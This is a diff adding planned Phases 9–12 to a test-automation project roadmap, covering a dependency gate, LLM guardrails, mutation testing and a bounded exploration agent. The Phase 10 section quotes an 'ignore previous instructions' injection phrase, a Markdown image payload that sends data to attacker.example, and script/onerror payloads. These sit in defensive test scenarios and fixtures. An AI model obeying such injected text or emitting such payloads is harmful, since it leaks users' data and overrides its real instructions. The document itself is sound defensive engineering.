@@ -50,6 +50,10 @@ After every completed milestone, update:
 | **6** | Visual Regression | ✅ Completed | Playwright `toHaveScreenshot` + `@visual` suite |
 | **7** | Historical Failure Trends | ✅ Completed | JSONL run history + Markdown trend reports |
 | **8** | AI Run / PR Summaries | ✅ Completed | Multi-suite Markdown summary + PR comments |
+| **9** | Dependency Gate | ⏳ Planned | `npm ci`, `npm audit`, new-package check, Dependabot |
+| **10** | LLM Guardrails | ⏳ Planned | OWASP LLM Top 10: prompt injection, output handling, input redaction |
+| **11** | Quality Gates for AI-Written Code | ⏳ Planned | Mutation testing, convention-aware PR review |
+| **12** | Agentic Exploratory Testing | ⏳ Planned | Spec-driven exploration agent via Playwright MCP |
 
 ---
 
@@ -2663,10 +2667,356 @@ Phase 3 classifier + Phase 4 flaky detector
 
 ---
 
+# Phase 9 — Dependency Gate
+
+**Status:** ⏳ Planned  
+**Completed:** —  
+**Current focus:** P9-M1
+
+### Goal
+
+Cheap first gate before the AI-specific work: make CI installs reproducible and stop hallucinated, brand-new or vulnerable packages from entering the repo (supply chain risk, OWASP LLM03 when the dependency was suggested by AI).
+
+### Design principles
+
+- `npm ci` everywhere: the lockfile is the source of truth
+- Only **new** dependencies are checked; version bumps are left to Dependabot + audit
+- Clear failure message naming the package and the rule it broke
+
+### User scenarios
+
+1. A PR adds a package that doesn't exist on npm or was published last week → CI fails with the reason.
+2. A PR introduces a dependency with a known high-severity advisory → audit fails.
+3. Dependabot opens weekly PRs for npm and GitHub Actions; the existing suites validate them.
+
+---
+
+## P9-M1 — CI hygiene + new-dependency gate
+
+### Implementation scope
+
+- CI: `npm install` → `npm ci` in all jobs; `npm audit --audit-level=high`
+- `ai/dep-gate/`: diff `package.json` + `app/package.json` against the PR base; for each **new** dependency, check that it exists on the registry, its age (`time.created`), and its weekly downloads; fail below the thresholds
+- Dependabot config for npm + GitHub Actions
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P9-M1-01 | No new deps → pass |
+| P9-M1-02 | Unknown package (registry 404, mocked) → fail with name |
+| P9-M1-03 | Package younger than threshold → fail |
+| P9-M1-04 | Version bump of existing dep → not treated as new |
+
+## P9-M2 — Docs
+
+- `docs/TESTING.md`: "CI gates" table started here (gate, trigger, threshold, how to fix); Phase 11 extends it
+- README: dependency gate listed under tooling
+
+### Acceptance criteria
+
+- [ ] All CI jobs use `npm ci` (P9-M1)
+- [ ] `npm audit --audit-level=high` in CI (P9-M1)
+- [ ] New-dependency gate with unit tests (P9-M1)
+- [ ] Dependabot for npm + GitHub Actions (P9-M1)
+- [ ] Gate documented (P9-M2)
+
+---
+
+## Phase 9 — Milestone Dependency Graph
+
+```text
+Phase 2 CI
+ └── P9-M1 CI hygiene + new-dependency gate
+      └── P9-M2 Docs
+```
+
+## Phase 9 — Progress Summary
+
+| Milestone | Status | Completed |
+|---|---|---|
+| P9-M1 — CI hygiene + new-dependency gate | ⏳ Planned | — |
+| P9-M2 — Docs | ⏳ Planned | — |
+
+---
+
+# Phase 10 — LLM Guardrails
+
+**Status:** ⏳ Planned  
+**Completed:** —  
+**Current focus:** —
+
+### Goal
+
+Treat the optional LLM step in the Failure Analyzer as untrusted, following the **OWASP Top 10 for LLM Applications**. Failure context (error text, page content) is attacker-controllable input. LLM output is untrusted text that ends up in HTML reports, Markdown reports and PR comments. Prove every guardrail with a fixture and a unit test.
+
+### Current state (baseline)
+
+- ✅ HTML report escapes all LLM fields (`escapeHtml` in `report.mts`)
+- ✅ `parseSuggestionPayload` type-checks `summary` / `hypotheses` / `caveats` and falls back to `null`
+- ⚠️ Markdown report (`markdownSuggestionSection`) inserts LLM text raw → links, images and inline HTML render on GitHub / in IDEs
+- ⚠️ No length or count caps on LLM fields
+- ⚠️ Error context is sent to the provider as-is, with no secret redaction
+
+### Design principles
+
+- Offline-first: every guardrail is testable with fixtures and a fake `fetchImpl`, so no API key is needed
+- Defence in depth: validate input → constrain prompt → validate output → encode for each sink (HTML, Markdown)
+- Fail closed: invalid LLM output → `null` → heuristic report still renders
+- Map each guardrail to an OWASP LLM ID in docs
+
+### User scenarios
+
+1. A failing test whose page text contains "ignore previous instructions…" still produces a sane, heuristic-anchored report.
+2. An LLM response containing `![x](https://attacker.example/?d=...)` renders as inert text in Markdown and PR comments.
+3. A `Bearer` token or `.env`-style secret in error context never leaves the machine.
+4. An oversized or malformed LLM response is rejected and the report falls back to heuristics.
+
+---
+
+## P10-M1 — Adversarial fixtures (LLM01 Prompt Injection)
+
+### Implementation scope
+
+- `ai/failure-analyzer/fixtures/prompt-injection/` — `error-context.md` with injected instructions (plain, hidden in a Markdown comment, in a fake "assistant" turn)
+- Wrap failure context in explicit delimiters in `buildRootCausePrompt`, and state in `SYSTEM_PROMPT` that the delimited block is data, not instructions
+- Fake-provider tests: a provider that "obeys" the injection must still be caught by output validation (P10-M2)
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P10-M1-01 | Prompt wraps error excerpt in delimiters; delimiter sequences inside the excerpt are neutralised |
+| P10-M1-02 | System prompt contains the data-not-instructions rule |
+| P10-M1-03 | Injected fixture + "obedient" fake provider → report still shows heuristic classification first |
+
+## P10-M2 — Output contract hardening (LLM05 Improper Output Handling)
+
+### Implementation scope
+
+- Strict schema in `parseSuggestionPayload`: `summary` ≤ 300 chars, 2–4 `hypotheses` ≤ 400 chars each, 1–3 `caveats`, no unknown keys
+- `escapeMarkdown()` used by `markdownSuggestionSection` and run-summary output: neutralise `![`, `[...](...)`, raw HTML tags, headings, and code fences
+- AI section always labelled "AI suggestion — unverified" in all formats
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P10-M2-01 | Image/link payload renders as inert text in Markdown |
+| P10-M2-02 | `<script>` / `<img onerror>` payload is escaped in HTML (regression guard) |
+| P10-M2-03 | Oversized or too many hypotheses → `null` → heuristic-only report |
+| P10-M2-04 | Extra keys / wrong types → `null` |
+
+## P10-M3 — Input redaction (LLM02 Sensitive Information Disclosure)
+
+### Implementation scope
+
+- `ai/shared/redact.mts`: redact bearer tokens, JWTs, `KEY=value` secrets, emails and URL query strings before building the prompt
+- Report notes how many items were redacted (never the values)
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P10-M3-01 | JWT / Bearer / `API_KEY=` values replaced with `[REDACTED]` |
+| P10-M3-02 | Fake provider asserts the request body contains no fixture secrets |
+| P10-M3-03 | Non-secret error text is unchanged |
+
+## P10-M4 — Docs
+
+- `docs/AI_GUIDELINES.md`: threat model table (input → prompt → output → sink) with OWASP IDs
+- Analyzer README: "Guardrails" section + demo command on the injection fixture
+- `docs/DEMO.md`: optional 1-minute "attack the analyzer" segment
+
+### Acceptance criteria
+
+- [ ] Injection fixture + tests (P10-M1)
+- [ ] Strict output schema + Markdown escaping (P10-M2)
+- [ ] Redaction before any provider call (P10-M3)
+- [ ] Threat model documented with OWASP mapping (P10-M4)
+- [ ] `npm run test:ai` green, no API key required
+
+---
+
+## Phase 10 — Milestone Dependency Graph
+
+```text
+Phase 3 failure analyzer (optional LLM)
+ └── P10-M1 Adversarial fixtures
+      ├── P10-M2 Output contract hardening
+      └── P10-M3 Input redaction
+           └── P10-M4 Docs
+```
+
+## Phase 10 — Progress Summary
+
+| Milestone | Status | Completed |
+|---|---|---|
+| P10-M1 — Adversarial fixtures | ⏳ Planned | — |
+| P10-M2 — Output contract hardening | ⏳ Planned | — |
+| P10-M3 — Input redaction | ⏳ Planned | — |
+| P10-M4 — Docs | ⏳ Planned | — |
+
+---
+
+# Phase 11 — Quality Gates for AI-Written Code
+
+**Status:** ⏳ Planned  
+**Completed:** —  
+**Current focus:** —
+
+### Goal
+
+Add CI gates that catch the typical failure modes of AI-assisted development (on top of the Phase 9 dependency gate): unit tests that are green but assert nothing, and test code that ignores the project's own conventions and fixtures.
+
+### Design principles
+
+- Each gate is a separate CI job with a clear pass/fail reason in the PR summary comment
+- LLM review is optional: a heuristic layer always runs, the LLM layer only runs when a key is present (it is skipped on fork PRs, which get no secrets)
+- Expensive gates (mutation testing) run on a path filter or nightly, not on every PR
+
+### User scenarios
+
+1. Someone weakens an `expect` in `ai/**/*.test.mts` → mutation score drops below threshold → CI fails.
+2. A new spec uses `page.waitForTimeout` and a CSS selector, and re-implements login → the PR comment points to `getByRole` and `auth.fixture`.
+
+---
+
+## P11-M1 — Mutation testing (Stryker)
+
+### Implementation scope
+
+- Spike: Stryker on `ai/**/*.mts` using the **command runner** (`npm run test:ai`), because there is no dedicated `node:test` runner
+- `npm run test:mutation`; HTML report uploaded as an artifact
+- `thresholds.break` set from the first baseline (e.g. baseline − 5%), then raised
+- CI: path filter on `ai/**` + nightly schedule
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P11-M1-01 | Baseline run completes; score recorded in docs |
+| P11-M1-02 | Deliberately weakened assertion → surviving mutant reported |
+| P11-M1-03 | Score below `break` → job fails |
+
+## P11-M2 — Convention-aware PR review of test code (LLM-as-a-judge)
+
+### Implementation scope
+
+- `ai/pr-review/`: collect the PR diff for `tests/**`
+- **Heuristic layer (always runs):** `waitForTimeout`, CSS/XPath locators where a role exists, missing suite tag, login steps re-implemented instead of `auth.fixture`, `test.only`
+- **LLM layer (optional):** prompt built from `docs/TESTING.md`, `docs/AI_GUIDELINES.md` and the fixtures index; output goes through Phase 10 schema + escaping
+- Findings appended to the existing sticky PR comment; the job comments and never blocks a merge on its own
+
+### Test cases
+
+| ID | Scenario |
+|---|---|
+| P11-M2-01 | Diff with `waitForTimeout` → heuristic finding with file:line |
+| P11-M2-02 | Diff re-implementing login → points to `auth.fixture` |
+| P11-M2-03 | No API key → heuristic-only, job passes |
+| P11-M2-04 | Fake LLM returns malicious Markdown → escaped in comment |
+
+## P11-M3 — Docs
+
+- `docs/TESTING.md`: extend the "CI gates" table from Phase 9 (gate, trigger, threshold, how to fix)
+- README: gates added to the AI tooling list and demo
+
+### Acceptance criteria
+
+- [ ] Stryker baseline + break threshold (P11-M1)
+- [ ] Heuristic + optional LLM review in PR comment (P11-M2)
+- [ ] Gates documented (P11-M3)
+
+---
+
+## Phase 11 — Milestone Dependency Graph
+
+```text
+Phase 9 dependency gate + Phase 10 guardrails
+ ├── P11-M1 Mutation testing
+ └── P11-M2 Convention-aware PR review
+      └── P11-M3 Docs
+```
+
+## Phase 11 — Progress Summary
+
+| Milestone | Status | Completed |
+|---|---|---|
+| P11-M1 — Mutation testing | ⏳ Planned | — |
+| P11-M2 — Convention-aware PR review | ⏳ Planned | — |
+| P11-M3 — Docs | ⏳ Planned | — |
+
+---
+
+# Phase 12 — Agentic Exploratory Testing
+
+**Status:** ⏳ Planned  
+**Completed:** —  
+**Current focus:** —
+
+### Goal
+
+Use the existing Playwright MCP setup to run a spec-driven exploration agent against the demo shop. The agent tries to break flows described in `docs/APP_SPEC.md` and reports findings as reproducible steps. It does not write tests on its own: a human promotes findings into specs.
+
+### Design principles
+
+- Bounded: step budget, allowed origin (`localhost:5173` only), no form submission outside the app
+- Every finding = steps + screenshot + spec reference; unreproducible findings are dropped
+- Seeded bugs prove the agent works (a known-bad build must yield findings)
+
+## P12-M1 — Exploration agent
+
+- `ai/explorer/`: charter per flow (cart, checkout, auth) generated from `APP_SPEC.md`; runs via Playwright MCP with a step budget
+- Output: JSONL findings + Markdown report (Phase 10 escaping applies)
+
+## P12-M2 — Seeded-bug evaluation
+
+- Feature flag in the demo app that injects 3–5 known bugs (e.g. negative quantity accepted, total not updated)
+- Metric: seeded bugs found / false positives per run, tracked like Phase 7 trends
+
+## P12-M3 — Finding → draft spec
+
+- Command that turns a confirmed finding into a draft `@e2e` spec using POM + fixtures, opened as a PR for human review
+
+## P12-M4 — Docs
+
+- `docs/DEMO.md` segment + honest limitations (cost, nondeterminism, budget)
+
+### Acceptance criteria
+
+- [ ] Bounded agent run produces a findings report (P12-M1)
+- [ ] Seeded-bug detection rate measured (P12-M2)
+- [ ] Finding → draft spec flow (P12-M3)
+- [ ] Limitations documented (P12-M4)
+
+## Phase 12 — Progress Summary
+
+| Milestone | Status | Completed |
+|---|---|---|
+| P12-M1 — Exploration agent | ⏳ Planned | — |
+| P12-M2 — Seeded-bug evaluation | ⏳ Planned | — |
+| P12-M3 — Finding → draft spec | ⏳ Planned | — |
+| P12-M4 — Docs | ⏳ Planned | — |
+
+---
+
+## Out of scope — separate repo: AI provenance gate
+
+AI governance and traceability (ISO/IEC 42001, ISO 27001 audit trail) lives in a separate, reusable GitHub Action. This repo then consumes it:
+
+- Detect AI-assisted changes from commit trailers (`Co-Authored-By: <AI tool>`, `Assisted-by:`) and PR labels
+- Require stricter gates for AI-tagged PRs (e.g. Phase 11 mutation threshold must run)
+- Emit an audit artifact per PR: AI-tagged files/lines, which gates ran, results
+- Cross-link from README once adopted here
+
+---
+
 ## Document History
 
 | Date | Change |
 |---|---|
+| 2026-11-06 | Phases 9–12 defined — dependency gate, LLM guardrails, quality gates for AI-written code, agentic exploratory testing |
 | 2026-08-10 | Docs sync — ARCHITECTURE/APP_SPEC/TESTING/LESSONS/AI_GUIDELINES aligned to Phases 1–8 |
 | 2026-08-10 | Docs polish — README 5-minute demo, architecture diagram, trace walkthrough |
 | 2026-08-10 | Phase 8 completed — AI run/PR summary CLI + sticky PR comments |
